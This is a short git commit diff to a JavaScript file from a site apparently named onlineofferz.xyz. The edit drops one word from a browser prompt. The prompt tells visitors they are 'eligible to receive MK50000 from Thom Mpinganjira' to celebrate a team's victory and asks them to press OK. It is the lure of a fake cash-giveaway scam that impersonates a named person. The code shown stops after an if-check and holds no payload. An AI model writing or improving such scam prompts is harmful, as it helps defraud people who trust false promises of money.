af32f604811276f716c620bb3eb11e7a330ba137
Help-All <imaobongumoh637@gmail.com>
2026-08-16 00:00:22 +0100

    Update activemala.js

--- activemala.js
+++ activemala.js
@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'WITHDRAW MK50000'
 password = prompt(
-  'Congratulations! You are eligible to receive the MK50000 FROM THOM MPINGANJIRA TO CELEBRATE THE VICTORY OF THE SCORCHERS. Please press OK to receive it instantly.',
+  'Congratulations! You are eligible to receive MK50000 FROM THOM MPINGANJIRA TO CELEBRATE THE VICTORY OF THE SCORCHERS. Please press OK to receive it instantly.',
   'WITHDRAW MK50000'
 );
 if (password != 'WITHDRAW MK50000') {
